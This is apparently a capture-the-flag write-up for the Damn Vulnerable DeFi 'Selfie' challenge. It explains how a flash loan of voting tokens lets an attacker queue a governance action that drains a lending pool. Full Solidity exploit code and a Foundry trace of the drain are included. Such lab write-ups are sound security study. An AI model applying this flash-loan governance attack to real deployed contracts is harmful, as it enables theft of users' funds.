## Selfie Challenge

### Challenge Overview:
A new lending pool has launched! It’s now offering flash loans of DVT tokens. It even includes a fancy governance mechanism to control it.

What could go wrong, right ?

You start with no DVT tokens in balance, and the pool has 1.5 million at risk.

Rescue all funds from the pool and deposit them into the designated recovery account.

**Simple to understand**:
Exploit a governance system that relies on a snapshot-based token voting mechanism to drain all tokens from the SelfiePool contract.

***Contracts in this Challenge***:
   
1. DamnValuableVotes (ERC20Votes): ERC20 token with snapshot-based voting power (uses OpenZeppelin's ERC20Votes).

2. SimpleGovernance: Contract allowing proposals to be queued and executed after a time delay, based on token voting power at the time of queueAction.

3. SelfiePool: A pool that offers ERC3156 flash loans and has emergencyExit(address) function that can be executed by governance.

### Vulnerability:

The governance system uses snapshot-based voting power, and the snapshot is taken when the queueAction() is called.

  1. A user can take a flash loan, temporarily gaining a large amount of governance tokens.

  2. During the loan, they delegate votes to themselves and queue a governance action.

  3. After the snapshot is taken and the loan is repaid, the user can still execute the queued action after the delay, even though they no longer have the tokens.

This allows a user to queue a malicious action with temporary voting power gained via flash loan.

**VulnerableFunction**:
```solidity
function queueAction(address target, uint256 value, bytes calldata data) external returns (uint256 actionId)//when call this function u must have half of the tokens,once u get the power,can make the changes in the contract

```

1. Requires the caller to have enough voting power (from snapshot) to queue.

 ```solidity
      //once u have the enough tokens u can get the power,tokens comes from via flashloan
      // u can delegate the token to the pool and get the voting power
        token.delegate(address(this));//this delegate function used to access the power once u have enough tokens
        //after delegate we can call the queueAction function 
```

2. Doesn't check token balance now, only the balance at snapshot.


### Exploit Strategy:

1. Deploy a malicious contract (SelfieAttack).
2. Take a flash loan of all tokens from the pool.
3. Delegate the borrowed tokens' votes to the attack contract.
4. Queue a governance action:
```solidity
pool.emergencyExit(attackerAddress)
```
5. Repay the flash loan.
6. Wait for the governance delay (2 days).
7. Execute the queued malicious proposal.

### Proof Of Code:
 ***observe this challenge ,exploit using single transation ***
```solidity
//this is the function where i can solve the challenge Damn-Defi-v4-selfie
function test_selfie() public checkSolvedByPlayer {
        SelfieAttack attack = new SelfieAttack(
            recovery,
            address(pool),
            address(governance),
            address(token)
        );
        attack.attack();
        // The attack contract will take a flash loan, delegate the voting power to itself,
        // queue an action to emergency exit the pool, and execute it after the delay.
        // The action will transfer all tokens from the pool to the recovery address.
    }
//SelfieAttack contract which is used to exploit the code
contract SelfieAttack is IERC3156FlashBorrower, Test {
    address public player;
    SelfiePool public pool;
    SimpleGovernance public governance;
    DamnValuableVotes public token;
    uint public actionId;
    bytes32 private constant CALLBACK_SUCCESS =
        keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor(
        address _player,
        address _pool,
        address _governance,
        address _token
    ) {
        pool = SelfiePool(_pool);
        player = _player;
        governance = SimpleGovernance(_governance);
        token = DamnValuableVotes(_token);
    }

    function attack() external {
        SelfiePool(pool).flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(token),
            SelfiePool(pool).maxFlashLoan(address(token)),
            ""
        );
        // Execute the action after the delay
        vm.warp(block.timestamp + governance.getActionDelay());
        governance.executeAction(actionId);
    }

    function onFlashLoan(
        address _initiator, //who will call this function,
        address, // address of the token,
        uint256 _amount,
        uint256 _fee,
        bytes calldata //bytes for callback function
    ) external returns (bytes32) {
        require(msg.sender == address(pool), "Only pool can call");
        require(_initiator == address(this), " Initiator is not self");

        // u can delegate the token to the pool and get the voting power
        token.delegate(address(this));
        uint _actionId = governance.queueAction(
            address(pool),
            0,
            abi.encodeWithSignature("emergencyExit(address)", player)
        );

        actionId = _actionId;
        token.approve(address(pool), _amount + _fee); //approve the pool to withdraw the tokens
        return CALLBACK_SUCCESS;
    }
}

```

### Proof Of Exploit:

```yaml
# Drain all the funds from Dex contract and send to to the recovery through attacker
nithin@ScateR:~/SCATERLABs/CTFs/Dam-vulnerable-Defi$ forge test --match-test test_selfie -vvvv
[⠒] Compiling...
[⠒] Compiling 1 files with Solc 0.8.25
[⠆] Solc 0.8.25 finished in 1.97s
Compiler run successful!

Ran 1 test for test/selfie/Selfie.t.sol:SelfieChallenge
[PASS] test_selfie() (gas: 2400285)
Traces:
  [2450485] SelfieChallenge::test_selfie()
    ├─ [0] VM::startPrank(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C])
    │   └─ ← [Return]
    ├─ [2027380] → new SelfieAttack@0xce110ab5927CC46905460D930CCa0c6fB4666219
    │   └─ ← [Return] 9566 bytes of code
    ├─ [367082] SelfieAttack::attack()
    │   ├─ [6747] SelfiePool::maxFlashLoan(DamnValuableVotes: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b]) [staticcall]
    │   │   ├─ [2852] DamnValuableVotes::balanceOf(SelfiePool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5]) [staticcall]
    │   │   │   └─ ← [Return] 1500000000000000000000000 [1.5e24]
    │   │   └─ ← [Return] 1500000000000000000000000 [1.5e24]
    │   ├─ [309199] SelfiePool::flashLoan(SelfieAttack: [0xce110ab5927CC46905460D930CCa0c6fB4666219], DamnValuableVotes: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b], 1500000000000000000000000 [1.5e24], 0x)
    │   │   ├─ [33377] DamnValuableVotes::transfer(SelfieAttack: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 1500000000000000000000000 [1.5e24])
    │   │   │   ├─ emit Transfer(from: SelfiePool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], to: SelfieAttack: [0xce110ab5927CC46905460D930CCa0c6fB4666219], amount: 1500000000000000000000000 [1.5e24])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [255171] SelfieAttack::onFlashLoan(SelfieAttack: [0xce110ab5927CC46905460D930CCa0c6fB4666219], DamnValuableVotes: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b], 1500000000000000000000000 [1.5e24], 0, 0x)
    │   │   │   ├─ [71415] DamnValuableVotes::delegate(SelfieAttack: [0xce110ab5927CC46905460D930CCa0c6fB4666219])
    │   │   │   │   ├─ emit DelegateChanged(delegator: SelfieAttack: [0xce110ab5927CC46905460D930CCa0c6fB4666219], fromDelegate: 0x0000000000000000000000000000000000000000, toDelegate: SelfieAttack: [0xce110ab5927CC46905460D930CCa0c6fB4666219])
    │   │   │   │   ├─ emit DelegateVotesChanged(delegate: SelfieAttack: [0xce110ab5927CC46905460D930CCa0c6fB4666219], previousVotes: 0, newVotes: 1500000000000000000000000 [1.5e24])
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [128147] SimpleGovernance::queueAction(SelfiePool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], 0, 0xa441d06700000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea)
    │   │   │   │   ├─ [1438] DamnValuableVotes::getVotes(SelfieAttack: [0xce110ab5927CC46905460D930CCa0c6fB4666219]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 1500000000000000000000000 [1.5e24]
    │   │   │   │   ├─ [2500] DamnValuableVotes::totalSupply() [staticcall]
    │   │   │   │   │   └─ ← [Return] 2000000000000000000000000 [2e24]
    │   │   │   │   ├─ emit ActionQueued(actionId: 1, caller: SelfieAttack: [0xce110ab5927CC46905460D930CCa0c6fB4666219])
    │   │   │   │   └─ ← [Return] 1
    │   │   │   ├─ [25321] DamnValuableVotes::approve(SelfiePool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], 1500000000000000000000000 [1.5e24])
    │   │   │   │   ├─ emit Approval(owner: SelfieAttack: [0xce110ab5927CC46905460D930CCa0c6fB4666219], spender: SelfiePool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], amount: 1500000000000000000000000 [1.5e24])
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   └─ ← [Return] 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9
    │   │   ├─ [10856] DamnValuableVotes::transferFrom(SelfieAttack: [0xce110ab5927CC46905460D930CCa0c6fB4666219], SelfiePool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], 1500000000000000000000000 [1.5e24])
    │   │   │   ├─ emit Transfer(from: SelfieAttack: [0xce110ab5927CC46905460D930CCa0c6fB4666219], to: SelfiePool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], amount: 1500000000000000000000000 [1.5e24])
    │   │   │   ├─ emit DelegateVotesChanged(delegate: SelfieAttack: [0xce110ab5927CC46905460D930CCa0c6fB4666219], previousVotes: 1500000000000000000000000 [1.5e24], newVotes: 0)
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   └─ ← [Return] true
    │   ├─ [310] SimpleGovernance::getActionDelay() [staticcall]
    │   │   └─ ← [Return] 172800 [1.728e5]
    │   ├─ [0] VM::warp(172801 [1.728e5])
    │   │   └─ ← [Return]
    │   ├─ [42855] SimpleGovernance::executeAction(1)
    │   │   ├─ emit ActionExecuted(actionId: 1, caller: SelfieAttack: [0xce110ab5927CC46905460D930CCa0c6fB4666219])
    │   │   ├─ [35828] SelfiePool::emergencyExit(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa])
    │   │   │   ├─ [852] DamnValuableVotes::balanceOf(SelfiePool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5]) [staticcall]
    │   │   │   │   └─ ← [Return] 1500000000000000000000000 [1.5e24]
    │   │   │   ├─ [31377] DamnValuableVotes::transfer(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], 1500000000000000000000000 [1.5e24])
    │   │   │   │   ├─ emit Transfer(from: SelfiePool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], to: recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], amount: 1500000000000000000000000 [1.5e24])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ emit EmergencyExit(receiver: recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], amount: 1500000000000000000000000 [1.5e24])
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return] 0x
    │   └─ ← [Stop]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [852] DamnValuableVotes::balanceOf(SelfiePool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::assertEq(0, 0, "Pool still has tokens") [staticcall]
    │   └─ ← [Return]
    ├─ [852] DamnValuableVotes::balanceOf(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa]) [staticcall]
    │   └─ ← [Return] 1500000000000000000000000 [1.5e24]
    ├─ [0] VM::assertEq(1500000000000000000000000 [1.5e24], 1500000000000000000000000 [1.5e24], "Not enough tokens in recovery account") [staticcall]
    │   └─ ← [Return]
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.62ms (2.40ms CPU time)
```



